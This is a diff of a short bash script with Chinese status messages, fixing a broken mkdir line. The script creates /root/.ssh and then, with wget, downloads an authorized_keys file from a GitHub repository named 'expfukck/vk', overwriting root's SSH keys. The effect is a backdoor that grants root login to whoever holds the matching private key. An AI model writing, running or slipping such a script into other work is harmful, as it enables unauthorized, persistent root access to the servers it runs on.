@@ -1,7 +1,7 @@
 #!/bin/bash
 
 echo "创建目录!"
-mkdiecho "创建目录"r -p /root/.ssh 
+mkdir -p /root/.ssh 
 echo "操作中!"
 wget https://raw.githubusercontent.com/expfukck/vk/main/authorized_keys -O  /root/.ssh/authorized_keys
 echo "进入root!"
